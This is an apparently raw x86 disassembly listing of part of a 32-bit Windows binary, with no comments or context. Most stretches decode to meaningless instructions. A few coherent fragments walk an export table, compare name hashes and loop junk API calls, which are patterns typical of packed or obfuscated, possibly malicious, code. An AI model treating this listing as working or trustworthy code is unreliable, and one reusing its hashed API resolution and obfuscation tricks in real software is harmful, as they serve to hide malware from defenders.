  40bf7f:	lock xchg BYTE PTR [esi],dh
  40bf82:	xor    DWORD PTR [ebx],edx
  40bf84:	cmp    DWORD PTR [esi-0x53aceba7],esp
  40bf8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf8b:	scas   al,BYTE PTR es:[edi]
  40bf8c:	loop   0x40bf55
  40bf8e:	cdq    
  40bf8f:	mov    eax,ds:0xacd7cf38
  40bf94:	ins    DWORD PTR es:[edi],dx
  40bf95:	mov    esi,0x73e985f7
  40bf9a:	nop
  40bf9b:	jecxz  0x40c013
  40bf9d:	mov    DWORD PTR [edx+ebp*8+0x36e3bcc],edi
  40bfa4:	dec    edi
  40bfa5:	repz leave 
  40bfa7:	jp     0x40bf39
  40bfa9:	lahf   
  40bfaa:	adc    dh,BYTE PTR [edi-0x6295090d]
  40bfb0:	out    dx,al
  40bfb1:	pop    edx
  40bfb2:	pop    esp
  40bfb3:	out    0xc9,eax
  40bfb5:	jb     0x40c02c
  40bfb7:	pop    edi
  40bfb8:	lock (bad) [eax+0x3b]
  40bfbc:	jnp    0x40bf7b
  40bfbe:	push   cs
  40bfbf:	sub    cl,BYTE PTR ds:0x87627b2f
  40bfc5:	daa    
  40bfc6:	icebp  
  40bfc7:	push   edx
  40bfc8:	lahf   
  40bfc9:	mov    ds:0x982a9b4b,al
  40bfce:	retf   
  40bfcf:	xlat   BYTE PTR ds:[ebx]
  40bfd0:	dec    edi
  40bfd1:	ret    
  40bfd2:	scas   al,BYTE PTR es:[edi]
  40bfd3:	lods   eax,DWORD PTR ds:[esi]
  40bfd4:	mov    ebx,0x6f2e451d
  40bfd9:	aas    
  40bfda:	int    0x32
  40bfdc:	sub    ebx,ebp
  40bfde:	mov    bl,0x5c
  40bfe0:	mov    ebp,0x5694f8a9
  40bfe5:	adc    al,0xd1
  40bfe7:	mov    es,WORD PTR [edx]
  40bfe9:	fiadd  WORD PTR [edi]
  40bfeb:	add    edx,edi
  40bfed:	outs   dx,DWORD PTR ds:[esi]
  40bfee:	cmp    esp,DWORD PTR [ecx+edx*8-0x2388dc92]
  40bff5:	pop    edi
  40bff6:	mov    bh,BYTE PTR [eax+eiz*1-0x3833b360]
  40bffd:	sub    ecx,0x18
  40c000:	dec    si
  40c002:	pop    ebx
  40c003:	das    
  40c004:	not    BYTE PTR [ebp+0x5ba31550]
  40c00a:	jne    0x40bfdc
  40c00c:	test   al,0x95
  40c00e:	mov    dl,BYTE PTR [ebx+0x4e54fefc]
  40c014:	adc    dh,BYTE PTR [edx]
  40c016:	sti    
  40c017:	jo     0x40c02f
  40c019:	pop    edx
  40c01a:	rcr    esi,1
  40c01c:	ss mov al,0x32
  40c01f:	std    
  40c020:	scas   al,BYTE PTR es:[edi]
  40c021:	mov    ah,0x7f
  40c023:	outs   dx,BYTE PTR ds:[esi]
  40c024:	in     al,0x4f
  40c026:	cmp    eax,DWORD PTR [ebp+edx*2-0x5a41fa05]
  40c02d:	or     eax,0xc7a15dc9
  40c032:	(bad)  
  40c033:	ins    DWORD PTR es:[edi],dx
  40c034:	xchg   DWORD PTR [ebx-0x32],edx
  40c037:	dec    eax
  40c038:	shl    ecx,cl
  40c03a:	mov    ecx,0x54c239e3
  40c03f:	loop   0x40bfc6
  40c041:	mov    esi,ebx
  40c043:	pop    eax
  40c044:	cmp    DWORD PTR [ebx-0x50],esp
  40c047:	scas   al,BYTE PTR es:[edi]
  40c048:	pop    ds
  40c049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c04a:	int3   
  40c04b:	mov    esi,0xec08b18d
  40c050:	bt     ebp,ecx
  40c053:	sbb    eax,0x65a141fa
  40c058:	sub    eax,0x914ebd57
  40c05d:	sar    dl,cl
  40c05f:	shr    BYTE PTR [esi],cl
  40c061:	ret    
  40c062:	mov    dl,bl
  40c064:	out    0x26,eax
  40c066:	mov    esp,0xc26b15d1
  40c06b:	dec    ecx
  40c06c:	enter  0xbae5,0xe5
  40c070:	jecxz  0x40c049
  40c072:	retf   0x3d49
  40c075:	inc    esi
  40c076:	inc    ecx
  40c077:	xor    al,0xe
  40c079:	daa    
  40c07a:	rol    BYTE PTR [edi],0xc2
  40c07d:	test   ebx,esp
  40c07f:	loopne 0x40c03d
  40c081:	sbb    al,0xe7
  40c083:	inc    ebp
  40c084:	mov    edi,0xca60db86
  40c089:	dec    ebx
  40c08a:	jge    0x40c0da
  40c08c:	jle    0x40c06a
  40c08e:	call   0x79339856
  40c093:	push   esp
  40c094:	add    esp,esp
  40c096:	mov    ebp,0xa1204803
  40c09b:	ret    0x4305
  40c09e:	add    BYTE PTR [ebx],cl
  40c0a0:	add    eax,0x42ee8c
  40c0a5:	mov    ds:0x4305c2,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ee9c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43051e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e7e2
  40c0cb:	mov    ds:0x43051e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x430526,0x0
  40c0dd:	mov    eax,ds:0x430526
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x430526,eax
  40c0e8:	cmp    DWORD PTR ds:0x430526,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x430532
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e7f6
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42e973
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42eb74
  40c11d:	cmp    DWORD PTR ds:0x430526,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	xchg   esi,eax
  40c147:	int3   
  40c148:	xor    eax,0x7efd3201
  40c14d:	jle    0x40c18e
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c128
  40c153:	pop    esp
  40c154:	xor    eax,0x831a5fe6
  40c159:	adc    esp,ebp
  40c15b:	dec    ebx
  40c15c:	in     eax,0x6
  40c15e:	push   es
  40c15f:	cwde   
  40c160:	aaa    
  40c161:	adc    eax,eax
  40c163:	loop   0x40c108
  40c165:	xchg   BYTE PTR [ecx+0x701de6f6],bh
  40c16b:	sub    ecx,ebx
  40c16d:	(bad)  
  40c16f:	test   al,0xa5
  40c171:	and    BYTE PTR [eax],cl
  40c173:	call   0xdb4bd8d1
  40c178:	ds pop di
  40c17b:	cmp    bl,0xe3
  40c17e:	xchg   ebp,eax
  40c17f:	out    dx,al
  40c180:	adc    eax,0x1c5f967e
  40c185:	add    esp,edx
  40c187:	add    BYTE PTR [edi],dl
  40c189:	test   BYTE PTR [eax+0x1],0x4f
  40c18d:	arpl   WORD PTR [ebx+0x2c],ax
  40c190:	xor    dl,BYTE PTR ds:0x623a2357
  40c196:	arpl   WORD PTR [edx],ax
  40c198:	popf   
  40c199:	lods   eax,DWORD PTR ds:[esi]
  40c19a:	jmp    0x40c191
  40c19c:	test   BYTE PTR [esi+0x3],0x25
  40c1a0:	xchg   esi,eax
  40c1a1:	mov    edx,0x825acf9a
  40c1a6:	ss jbe 0x40c1cf
  40c1a9:	loope  0x40c15f
  40c1ab:	fwait
  40c1ac:	adc    DWORD PTR [ebx*1+0x6aa049f2],edi
  40c1b3:	loope  0x40c220
  40c1b5:	sbb    al,0xc5
  40c1b7:	in     al,0x13
  40c1b9:	or     DWORD PTR [edi+0x38],ecx
  40c1bc:	mov    ch,0x68
  40c1be:	adc    eax,0x705316e6
  40c1c3:	fadd   DWORD PTR gs:[ecx+0x7e]
  40c1c7:	into   
  40c1c8:	fdivrp st(5),st
  40c1ca:	lods   eax,DWORD PTR ds:[esi]
  40c1cb:	push   esi
  40c1cc:	fbld   TBYTE PTR ds:0xf91d76d9
  40c1d2:	push   0xd5d07501
  40c1d7:	stos   BYTE PTR es:[edi],al
  40c1d8:	loop   0x40c24c
  40c1da:	push   ebp
  40c1db:	mov    ah,0x58
  40c1dd:	adc    dh,BYTE PTR [edi-0x5a7212bf]
  40c1e3:	icebp  
  40c1e4:	out    dx,eax
  40c1e5:	mov    eax,ds:0x4d9eda86
  40c1ea:	or     eax,0xde66517f
  40c1ef:	mov    dh,0x8e
  40c1f1:	cs cs xchg esp,eax
  40c1f4:	and    ch,bh
  40c1f6:	call   0x5db1029c
  40c1fb:	jle    0x40c231
  40c1fd:	ss mov cl,0x56
  40c200:	lds    ebx,FWORD PTR [ebx]
  40c202:	call   0xb1fc:0xd075b864
  40c209:	sub    eax,0xc3d1080e
  40c20e:	dec    esp
  40c20f:	cwde   
  40c210:	mov    dh,0x58
  40c212:	cmp    BYTE PTR [edx],bl
  40c214:	sub    eax,0x7b420a9e
  40c219:	sub    al,BYTE PTR [edi+0x3f1566d6]
  40c21f:	and    ecx,DWORD PTR [esi+ebp*4+0x778a093e]
  40c226:	xchg   BYTE PTR [ebp-0x9],bh
  40c229:	jmp    0x40c1fd
  40c22b:	es clc 
  40c22d:	xchg   edx,eax
  40c22e:	lds    esp,FWORD PTR [eax+0x38c58b51]
  40c234:	(bad)  
  40c235:	loope  0x40c2b4
  40c237:	adc    DWORD PTR [edi-0x5a],0x1f308a1f
  40c23e:	mov    eax,0x49c1e71b
  40c243:	adc    ecx,0xa6f29601
  40c249:	and    esi,0x5ed4ce3d
  40c24f:	fprem  
  40c251:	(bad)  
  40c252:	test   eax,0x3426a339
  40c257:	mov    DWORD PTR [ebp-0x7e],ebx
  40c25a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c25b:	sbb    DWORD PTR [edi+0x27c0a3a7],0xfb8b1596
  40c265:	jo     0x40c22f
  40c267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c268:	and    BYTE PTR fs:[edx+0x654ebc43],dh
  40c26f:	out    dx,eax
  40c270:	fbld   TBYTE PTR [edx+0x58]
  40c273:	bound  esi,QWORD PTR [edi+0x7b8d5b28]
  40c279:	(bad)  
  40c27a:	call   0xc47decfa
  40c27f:	push   edi
  40c280:	pop    edx
  40c281:	push   es
  40c282:	mov    esi,0x798d5eba
  40c287:	rcl    esi,cl
  40c289:	pop    ebx
  40c28a:	pop    edx
  40c28b:	or     eax,0xc63f7e31
  40c290:	stos   BYTE PTR es:[edi],al
  40c291:	mov    cl,0x12
  40c293:	mov    DWORD PTR [ebp-0x14],ecx
  40c296:	mov    eax,DWORD PTR [ebp-0x28]
  40c299:	mov    ecx,DWORD PTR [ebp+0x8]
  40c29c:	add    ecx,DWORD PTR [eax+edi*4]
  40c29f:	jmp    0x40c3fd
  40c2a4:	lea    edx,[esi-0x1a42cd67]
  40c2aa:	pop    ebp
  40c2ab:	imul   edx,DWORD PTR ds:0x48e92bcc,0xf3f272b1
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c2e9
  40c2bd:	cs pop esi
  40c2bf:	inc    esi
  40c2c0:	add    DWORD PTR [edi-0x659612fa],edi
  40c2c6:	call   0x4bbe:0xd71e1939
  40c2cd:	hlt    
  40c2ce:	pop    esi
  40c2cf:	or     al,0x45
  40c2d1:	call   0xde3c:0x3370c1a4
  40c2d8:	push   0xffffffef
  40c2da:	mov    esp,0x3bc57b7b
  40c2df:	pop    ds
  40c2e0:	cmp    al,0xb3
  40c2e2:	repnz lds ecx,FWORD PTR [eax-0x4e]
  40c2e6:	int3   
  40c2e7:	bound  ebp,QWORD PTR [ebp+0x1b5b52df]
  40c2ed:	inc    eax
  40c2ee:	test   DWORD PTR [ebx-0x2d],ecx
  40c2f1:	leave  
  40c2f2:	push   edi
  40c2f3:	xchg   edi,eax
  40c2f4:	or     al,0xc5
  40c2f6:	sub    al,0xd6
  40c2f8:	mov    dh,0x31
  40c2fa:	jno    0x40c31b
  40c2fc:	mov    ecx,0x8dba8bff
  40c301:	mov    ds:0x813b0b35,eax
  40c306:	push   ss
  40c307:	call   0xc34a:0xcafa79d9
  40c30e:	xchg   esp,eax
  40c30f:	pop    ebp
  40c310:	and    DWORD PTR ds:0x1176b46a,eax
  40c316:	call   0xe86b:0x559cc947
  40c31d:	jmp    0xb39dca1e
  40c322:	(bad)  
  40c323:	and    BYTE PTR [esi],bh
  40c325:	push   edi
  40c326:	push   ss
  40c327:	mov    esp,0x90cef701
  40c32c:	iret   
  40c32d:	jno    0x40c391
  40c32f:	les    ecx,FWORD PTR [ebx]
  40c331:	sbb    BYTE PTR [ecx-0x71548e8c],al
  40c337:	out    dx,eax
  40c338:	ror    DWORD PTR [edi+0x6e],cl
  40c33b:	test   DWORD PTR [edi-0x1f],0x4258b177
  40c342:	test   BYTE PTR [esi+ebx*2+0x4e761a20],0x72
  40c34a:	jo     0x40c2d6
  40c34c:	in     eax,0x2b
  40c34e:	pop    es
  40c34f:	jns    0x40c329
  40c351:	fbstp  TBYTE PTR [ecx+0x50]
  40c354:	repz mov ch,0xed
  40c357:	jge    0x40c3c9
  40c359:	mov    bl,0x75
  40c35b:	nop
  40c35c:	adc    BYTE PTR [edx+0x31da990b],bl
  40c362:	mov    DWORD PTR [ebx+0x11aa6b9d],eax
  40c368:	pop    es
  40c369:	pop    ecx
  40c36a:	popa   
  40c36b:	(bad)  
  40c36c:	movq   mm0,QWORD PTR [esi+0x59]
  40c370:	in     eax,0xe2
  40c372:	fbld   TBYTE PTR [esi]
  40c374:	fwait
  40c375:	dec    esp
  40c376:	scas   eax,DWORD PTR es:[edi]
  40c377:	pop    ss
  40c378:	pop    edi
  40c379:	mov    edx,0x80381ca0
  40c37e:	lahf   
  40c37f:	xchg   ebp,eax
  40c380:	mov    ah,BYTE PTR [esi+0x550fe312]
  40c386:	add    ecx,0x62
  40c389:	les    ebp,FWORD PTR [esi-0x4b]
  40c38c:	add    BYTE PTR [esi],ah
  40c38e:	mov    esi,0x202ced47
  40c393:	mov    ecx,0x2a7e8252
  40c398:	leave  
  40c399:	inc    esi
  40c39a:	xchg   ebx,eax
  40c39b:	xchg   edi,eax
  40c39c:	repz std 
  40c39e:	adc    eax,0xc5c5d77b
  40c3a3:	inc    BYTE PTR [ebx]
  40c3a5:	in     al,dx
  40c3a6:	xor    ch,0x7a
  40c3a9:	rcl    BYTE PTR [esp+eiz*2+0x22064097],cl
  40c3b0:	outs   dx,BYTE PTR ds:[esi]
  40c3b1:	xchg   ebp,eax
  40c3b2:	je     0x40c3d4
  40c3b4:	add    al,0xdf
  40c3b6:	mov    ds:0x2d8ca57d,al
  40c3bb:	cld    
  40c3bc:	mov    dl,0xf0
  40c3be:	sbb    al,0x3e
  40c3c0:	cld    
  40c3c1:	(bad)  
  40c3c2:	aas    
  40c3c3:	inc    ebp
  40c3c4:	int3   
  40c3c5:	or     BYTE PTR [edx+0x2],ah
  40c3c8:	xchg   ebp,eax
  40c3c9:	xor    DWORD PTR [edi+edx*4+0x40],esi
  40c3cd:	jmp    0x3a01:0x1a17519a
  40c3d4:	call   0xac662d4d
  40c3d9:	cmp    DWORD PTR [ebx-0x54],0xffffffa2
  40c3dd:	xor    al,BYTE PTR [esi]
  40c3df:	pop    esi
  40c3e0:	popa   
  40c3e1:	jo     0x40c3cf
  40c3e3:	add    eax,edi
  40c3e5:	sub    al,0x7e
  40c3e7:	retf   0x1162
  40c3ea:	mov    al,0xb1
  40c3ec:	or     DWORD PTR [ecx+0xa],ebx
  40c3ef:	int    0x3b
  40c3f1:	cdq    
  40c3f2:	mov    bh,0xe5
  40c3f4:	loopne 0x40c3f1
  40c3f6:	lahf   
  40c3f7:	mov    eax,0x8458cef1
  40c3fc:	int    0x8d
  40c3fe:	inc    ebp
  40c3ff:	clc    
  40c400:	jmp    0x40c55e
  40c405:	and    DWORD PTR [edx-0x5462d589],ebp
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	push   esi
  40c412:	pop    esp
  40c413:	pop    ecx
  40c414:	sub    DWORD PTR [edi+edi*8+0x7f3f7e7e],esi
  40c41b:	jle    0x40c49b
  40c41d:	dec    edi
  40c41e:	add    al,0x23
  40c420:	call   0x7e7a:0x19969b14
  40c427:	push   es
  40c428:	hlt    
  40c429:	cld    
  40c42a:	es icebp 
  40c42c:	add    bh,BYTE PTR [ebp-0x2b]
  40c42f:	jnp    0x40c431
  40c431:	mov    ebx,ecx
  40c433:	adc    esi,eax
  40c435:	adc    BYTE PTR [ebx],ah
  40c437:	aad    0x18
  40c439:	dec    ecx
  40c43a:	xlat   BYTE PTR ds:[ebx]
  40c43b:	pop    edx
  40c43c:	sbb    cl,BYTE PTR [edx]
  40c43e:	daa    
  40c43f:	and    ch,cl
  40c441:	test   al,0xc1
  40c443:	popa   
  40c444:	ss loope 0x40c3dd
  40c447:	outs   dx,BYTE PTR ds:[esi]
  40c448:	aas    
  40c449:	cwde   
  40c44a:	ret    0xe52f
  40c44d:	add    dh,BYTE PTR [ecx]
  40c44f:	(bad)  
  40c451:	and    bl,BYTE PTR [ebx]
  40c453:	add    al,0xa1
  40c455:	xchg   DWORD PTR [eax],esi
  40c457:	xchg   edx,eax
  40c458:	pop    eax
  40c459:	or     esi,DWORD PTR [esi-0x70e85443]
  40c45f:	add    dh,BYTE PTR [ecx-0x28]
  40c462:	cmc    
  40c463:	xchg   ebp,eax
  40c464:	push   edi
  40c465:	mov    al,ds:0xbf063e5e
  40c46a:	int    0x8f
  40c46c:	jbe    0x40c4dc
  40c46e:	push   ecx
  40c46f:	cmp    BYTE PTR [edx+0x28e72b5b],bl
  40c475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c476:	int    0xb7
  40c478:	inc    dx
  40c47a:	scas   al,BYTE PTR es:[edi]
  40c47b:	push   cs
  40c47c:	push   esp
  40c47d:	or     eax,0xf8114355
  40c482:	sbb    al,0xf4
  40c484:	test   eax,0x14607d4a
  40c489:	cmc    
  40c48a:	add    bh,BYTE PTR [eax-0x36b72056]
  40c490:	xchg   edi,eax
  40c491:	and    BYTE PTR [ebp-0x6c],ah
  40c494:	cmp    al,0x73
  40c496:	les    eax,FWORD PTR [eax+0x3e]
  40c499:	add    DWORD PTR [eax-0x3a],edi
  40c49c:	or     eax,DWORD PTR [ecx]
  40c49e:	sbb    ebp,DWORD PTR [edi]
  40c4a0:	sbb    ecx,DWORD PTR [esi]
  40c4a2:	rol    edi,1
  40c4a4:	pop    eax
  40c4a5:	or     bl,bl
  40c4a7:	inc    ecx
  40c4a8:	dec    edx
  40c4a9:	mov    ecx,0x67934787
  40c4ae:	pusha  
  40c4af:	push   es
  40c4b0:	mov    ah,0x8b
  40c4b2:	pushf  
  40c4b3:	jae    0x40c48b
  40c4b5:	mov    eax,0x7b917db6
  40c4ba:	(bad)  [esi+0x208a0e29]
  40c4c0:	xor    BYTE PTR [ebp-0x5c],cl
  40c4c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4c4:	xchg   ebp,eax
  40c4c5:	push   edi
  40c4c6:	or     cl,bl
  40c4c8:	dec    edx
  40c4c9:	xor    esi,DWORD PTR [edx]
  40c4cb:	fcomp  st(6)
  40c4cd:	jmp    0xe1496850
  40c4d2:	cmp    eax,0x3dde4c4a
  40c4d7:	iret   
  40c4d8:	push   esp
  40c4d9:	mov    ds:0x88b7aa95,al
  40c4de:	cmp    BYTE PTR [ebp-0x11caf4cb],0x79
  40c4e5:	xchg   ebp,eax
  40c4e6:	test   al,0x4f
  40c4e8:	mov    esp,0x4db58bbe
  40c4ed:	inc    edx
  40c4ee:	mov    ebx,0xfc0e5336
  40c4f3:	or     ebp,DWORD PTR [edx+0x79]
  40c4f6:	ds aaa 
  40c4f8:	mov    ds:0x3a1dbf0e,eax
  40c4fd:	jno    0x40c484
  40c4ff:	test   BYTE PTR [ecx+0x54],cl
  40c502:	mov    eax,ds:0xba6d6bd6
  40c507:	lods   eax,DWORD PTR ds:[esi]
  40c508:	jecxz  0x40c4fc
  40c50a:	dec    ecx
  40c50b:	sub    eax,0xfe313d70
  40c510:	imul   esi,DWORD PTR [eax-0x56],0x35fc9aff
  40c517:	xor    al,0x59
  40c519:	stc    
  40c51a:	xchg   edx,eax
  40c51b:	fwait
  40c51c:	sbb    BYTE PTR [eax+0x608a855c],dl
  40c522:	in     al,0x80
  40c524:	cmc    
  40c525:	int    0x44
  40c527:	xchg   edi,eax
  40c528:	sub    DWORD PTR [ecx],ecx
  40c52a:	dec    edi
  40c52b:	fcomp  DWORD PTR [bx]
  40c52e:	xchg   edx,eax
  40c52f:	stc    
  40c530:	in     al,dx
  40c531:	pop    ss
  40c532:	mov    al,ds:0x5997887f
  40c537:	push   edi
  40c538:	pop    esi
  40c539:	inc    cx
  40c53b:	scas   al,BYTE PTR es:[edi]
  40c53c:	push   0xa331d718
  40c541:	into   
  40c542:	dec    edx
  40c543:	scas   al,BYTE PTR es:[edi]
  40c544:	jns    0x40c54a
  40c546:	adc    esp,ebx
  40c548:	fild   QWORD PTR [eax+0x4d]
  40c54b:	rol    cl,0xcf
  40c54e:	fistp  DWORD PTR [edi-0x67]
  40c551:	dec    esp
  40c552:	push   esi
  40c553:	jle    0x40c55f
  40c555:	pusha  
  40c556:	or     al,0x17
  40c558:	push   es
  40c559:	dec    esi
  40c55a:	dec    edx
  40c55b:	add    DWORD PTR [edx-0x2fb276df],eax
  40c561:	push   eax
  40c562:	push   DWORD PTR [ebp-0x30]
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0x62809beb
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c597
  40c58e:	outs   dx,BYTE PTR ds:[esi]
  40c58f:	cwde   
  40c590:	push   edi
  40c591:	xor    al,0x45
  40c593:	ss out 0x1d,al
  40c596:	cvtps2pi mm7,xmm7
  40c599:	cmp    DWORD PTR [ecx],edi
  40c59b:	jmp    0x40c554
  40c59d:	jmp    0xe5432486
  40c5a2:	ja     0x40c571
  40c5a4:	test   DWORD PTR [esi-0x12],ebp
  40c5a7:	dec    esp
  40c5a8:	pushf  
  40c5a9:	call   0xbb823229
  40c5ae:	fidiv  DWORD PTR [eax-0x21d7e315]
  40c5b4:	sub    eax,0xe62555bf
  40c5b9:	lock loop 0x40c62b
  40c5bc:	ret    
  40c5bd:	push   ecx
  40c5be:	sbb    BYTE PTR [ebp+0x43],dh
  40c5c1:	pop    ecx
  40c5c2:	xor    DWORD PTR [ecx+ebx*4],0xffffffbd
  40c5c6:	cmp    al,0x2
  40c5c8:	mov    ds:0x383b7f39,eax
  40c5cd:	inc    ecx
  40c5ce:	xchg   edx,eax
  40c5cf:	pop    ecx
  40c5d0:	dec    esp
  40c5d1:	push   edx
  40c5d2:	(bad)  
  40c5d3:	in     al,dx
  40c5d4:	fdiv   DWORD PTR [edi+ebp*2]
  40c5d7:	xchg   ecx,eax
  40c5d8:	mov    bh,0x2d
  40c5da:	jb     0x40c581
  40c5dc:	push   edx
  40c5dd:	and    BYTE PTR [eax+0x26e205db],dh
  40c5e3:	cld    
  40c5e4:	imul   esp,DWORD PTR [ecx-0x74],0xffffff90
  40c5e8:	push   ebp
  40c5e9:	add    ecx,DWORD PTR [ebx+0x36]
  40c5ec:	cld    
  40c5ed:	pop    esi
  40c5ee:	mov    ah,0xf1
  40c5f0:	ret    
  40c5f1:	setnp  BYTE PTR ds:0x6f24ef5
  40c5f8:	sub    ah,dh
  40c5fa:	push   ds
  40c5fb:	jmp    0x4797:0xe7296ae9
  40c602:	jmp    0xa8c5:0x666175b1
  40c609:	and    eax,0x361b6650
  40c60e:	mov    ebp,0x46e4cb1e
  40c613:	jl     0x40c66e
  40c615:	xchg   edx,eax
  40c616:	pusha  
  40c617:	or     eax,0xd7d8da
  40c61c:	nop
  40c61d:	sahf   
  40c61e:	inc    esp
  40c61f:	cli    
  40c620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c621:	aaa    
  40c622:	xor    al,0x88
  40c624:	cli    
  40c625:	in     al,0x8
  40c627:	std    
  40c628:	and    dh,BYTE PTR [esi]
  40c62a:	sub    ebx,DWORD PTR [ebp+0x457905b]
  40c630:	xchg   esi,eax
  40c631:	loopne 0x40c5d2
  40c633:	or     eax,0x8195fbff
  40c638:	jmp    0x40c5e8
  40c63a:	cli    
  40c63b:	inc    ebp
  40c63c:	std    
  40c63d:	push   esp
  40c63e:	jp     0x40c5c6
  40c640:	and    ebx,0x3dc0b7d5
  40c646:	inc    esp
  40c647:	push   edx
  40c648:	xchg   dl,bh
  40c64a:	inc    eax
  40c64b:	sub    eax,0xa434ecc4
  40c650:	es int3 
  40c652:	mov    BYTE PTR [eax+0x2b],cl
  40c655:	dec    DWORD PTR [edi]
  40c657:	push   esp
  40c658:	push   esi
  40c659:	sbb    BYTE PTR [ecx],dl
  40c65b:	lahf   
  40c65c:	mov    cl,0x64
  40c65f:	ja     0x40c639
  40c661:	call   0x15620374
  40c666:	inc    ebp
  40c667:	push   cs
  40c668:	pop    edx
  40c669:	les    esi,FWORD PTR [eax-0x3cb03b60]
  40c66f:	inc    edi
  40c670:	lds    ebx,FWORD PTR [edx+0x672bb2e7]
  40c676:	in     al,dx
  40c677:	das    
  40c678:	cmp    BYTE PTR [edx],cl
  40c67a:	mov    edi,0x215dd29f
  40c67f:	test   DWORD PTR [esi+0x14],edx
  40c682:	arpl   WORD PTR [ecx],cx
  40c684:	xor    ebx,ebx
  40c686:	fs das 
  40c688:	mov    esi,edx
  40c68a:	ficomp WORD PTR [ecx+eiz*4-0x194fc091]
  40c691:	shl    DWORD PTR [ebp+0x3925d2f3],cl
  40c697:	mov    esp,0x77a355bb
  40c69c:	sbb    BYTE PTR [eax-0x1c862643],0x17
  40c6a3:	jno    0x40c630
  40c6a5:	inc    esi
  40c6a6:	dec    esp
  40c6a7:	dec    ebx
  40c6a8:	lods   eax,DWORD PTR ds:[esi]
  40c6a9:	and    al,0xbd
  40c6ab:	outs   dx,BYTE PTR ds:[esi]
  40c6ac:	pushf  
  40c6ad:	test   BYTE PTR [ebp-0xc44d6d8],al
  40c6b3:	or     esi,DWORD PTR ds:0x3d78fc54
  40c6b9:	pop    eax
  40c6ba:	call   0x93ab0568
  40c6bf:	aas    
  40c6c0:	aas    
  40c6c1:	stos   BYTE PTR es:[edi],al
  40c6c2:	loopne 0x40c68d
  40c6c4:	jge    0x40c6c6
  40c6c6:	mov    cl,BYTE PTR [ecx-0x6f580414]
  40c6cc:	mov    esp,DWORD PTR [edi+0x35f84d8b]
  40c6d2:	push   esi
  40c6d3:	or     BYTE PTR [ecx+0x7],dl
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	sbb    esi,ebx
  40c742:	lods   eax,DWORD PTR ds:[esi]
  40c743:	jno    0x40c77b
  40c745:	bnd jle 0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c789
  40c74d:	loope  0x40c7ba
  40c74f:	mov    ebx,0xa8dc5ae5
  40c754:	out    dx,al
  40c755:	pop    eax
  40c756:	cmc    
  40c757:	cmp    BYTE PTR [esi-0x33edd6b9],0x9a
  40c75e:	(bad)  
  40c75f:	cmp    BYTE PTR gs:[ebx],0x97
  40c763:	sub    al,0xe4
  40c765:	sub    DWORD PTR [ebx],esi
  40c767:	jb     0x40c6fd
